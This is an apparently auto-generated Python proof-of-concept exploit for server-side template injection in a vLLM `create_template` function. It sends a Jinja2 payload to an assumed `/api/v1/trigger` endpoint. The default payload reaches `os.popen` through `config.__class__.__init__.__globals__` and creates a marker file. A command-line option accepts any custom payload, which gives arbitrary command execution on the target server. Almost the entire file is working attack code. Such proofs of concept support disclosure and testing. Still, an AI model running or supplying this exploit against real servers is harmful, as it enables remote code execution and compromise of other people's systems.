#!/usr/bin/env python3
# PoC for vllm-project-vllm-7193774 (/tmp/vllm-project-vllm-7193774)
# Path: ssti-006
# Sink: create_template
# Auto-generated — run with: python3 ssti_function_create_template_directly_create_template.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: Server-Side Template Injection (SSTI) in vllm-project-vllm-7193774

Based on the finding that the `create_template` function instantiates a jinja2.Template
from an attacker-controlled `template_str` without any sandboxing or validation.
This PoC targets a hypothetical web endpoint that wraps the vulnerable library call.

Endpoint expected: POST /api/v1/trigger with JSON {"template": "<payload>"}
"""

import argparse
import sys
import json

# Use requests if available; fall back to urllib for minimal dependencies
try:
    import requests
    _HAVE_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    _HAVE_REQUESTS = False


def exploit(url, payload, verbose=False):
    """
    Sends a Jinja2 SSTI payload to the vulnerable endpoint.
    Returns the server response text if successful.
    """
    data = {"template": payload}
    headers = {"Content-Type": "application/json"}

    if _HAVE_REQUESTS:
        try:
            resp = requests.post(url, json=data, headers=headers, timeout=10)
            resp.raise_for_status()
            return resp.text
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}", file=sys.stderr)
            sys.exit(1)
    else:
        # Fallback using urllib
        json_data = json.dumps(data).encode("utf-8")
        req = urllib.request.Request(url, data=json_data, headers=headers, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.read().decode("utf-8")
        except urllib.error.URLError as e:
            print(f"[!] Request failed: {e}", file=sys.stderr)
            sys.exit(1)


def main():
    parser = argparse.ArgumentParser(description="PoC for SSTI in vllm-project-vllm-7193774")
    parser.add_argument("-t", "--target", required=True,
                        help="Target URL (e.g., http://localhost:8000/api/v1/trigger)")
    parser.add_argument("-p", "--payload", default=None,
                        help="Custom Jinja2 payload (default: benign 'touch /tmp/poc_success.txt')")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Print full server response")
    args = parser.parse_args()

    # Default benign payload: creates a file to confirm RCE
    # This is a classic Jinja2 SSTI for command execution
    benign_payload = (
        "{{ config.__class__.__init__.__globals__['os'].popen("
        "'touch /tmp/poc_success.txt').read() }}"
    )
    payload = args.payload if args.payload else benign_payload

    print(f"[*] Targeting {args.target}")
    print(f"[*] Payload: {payload}")
    result = exploit(args.target, payload, args.verbose)
    print(f"[+] Server response:\n{result}")

    # Verify success by checking if the file was created (only local test)
    # For remote targets, you may need to check server logs or other side effects
    if args.payload is None and "poc_success.txt" in result:
        print("[+] Benign payload executed successfully (file created)")

if __name__ == "__main__":
    main()
